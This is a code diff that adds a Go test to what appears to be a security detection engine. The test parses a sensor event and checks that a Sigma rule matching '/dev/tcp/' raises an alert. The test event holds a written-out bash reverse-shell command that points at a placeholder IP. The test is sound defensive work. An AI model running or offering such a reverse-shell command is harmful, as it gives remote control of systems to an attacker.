@@ -107,6 +107,40 @@ detection:
 	}
 }
 
+// TestMimiStreamEventFiresRule proves the sensor-to-brain detection path end to end in code: a
+// reverse-shell exec in mimi's OCSF wire shape flows mimi parser -> Event -> ProcessEvent -> a
+// Sigma rule -> a dispatched alert. The only thing this cannot exercise without a kernel is the
+// probe's live capture of that exec (a sudo load test); everything downstream of the wire is here.
+func TestMimiStreamEventFiresRule(t *testing.T) {
+	line := `{"schema":"mimi/2","process":{"pid":42,"name":"bash",` +
+		`"cmd_line":"bash -i >& /dev/tcp/192.0.2.1/4444",` +
+		`"file":{"path":"/usr/bin/bash"},"user":{"uid":"0"}},` +
+		`"ancestry":[{"pid":42,"name":"bash"}]}`
+	evs, err := parser.Mimi{}.Parse(strings.NewReader(line))
+	if err != nil || len(evs) != 1 {
+		t.Fatalf("mimi parse: err=%v, events=%d (want 1)", err, len(evs))
+	}
+	if evs[0].Source != "mimi" {
+		t.Fatalf("Source = %q, want mimi", evs[0].Source)
+	}
+
+	r := testRule(t, `title: reverse shell
+detection:
+  sel:
+    CommandLine|contains: /dev/tcp/
+  condition: sel`)
+	rec := &countingSink{}
+	eng := New([]*sigma.Rule{r}, nil, alert.NewDispatcher(rec))
+
+	n, errs := eng.ProcessEvent(evs[0])
+	if len(errs) != 0 {
+		t.Fatalf("errs = %v", errs)
+	}
+	if n != 1 || rec.count != 1 {
+		t.Fatalf("alerts=%d sink=%d, want 1/1 (a mimi exec event must fire the rule and dispatch)", n, rec.count)
+	}
+}
+
 type countingSink struct{ count int }
 
 func (c *countingSink) Name() string           { return "counting" }
